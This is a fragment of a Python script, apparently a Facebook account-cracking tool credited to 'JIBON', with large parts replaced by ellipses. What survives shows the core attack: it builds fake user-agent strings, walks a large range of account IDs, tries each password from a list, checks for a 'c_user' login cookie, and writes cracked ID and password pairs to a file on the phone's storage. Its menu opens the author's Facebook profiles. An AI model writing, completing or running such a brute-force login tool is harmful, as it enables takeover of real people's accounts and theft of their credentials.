#JIBON(SAT SHAHIN YT)(SHAHI. ALAM)
...
for xd in range(3005):
    ...
    uas.append(ff)
for JIBON in range(9993,176281):
...
def admin():
	...
	if bal =='1':
		...
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/JIBON.AHMED2007?mibextid=ZbWKwL');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://www.facebook.com/JIBON.AHMED65?mibextid=ZbWKwL');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mJIBON1×1\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/JIBON1×1-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
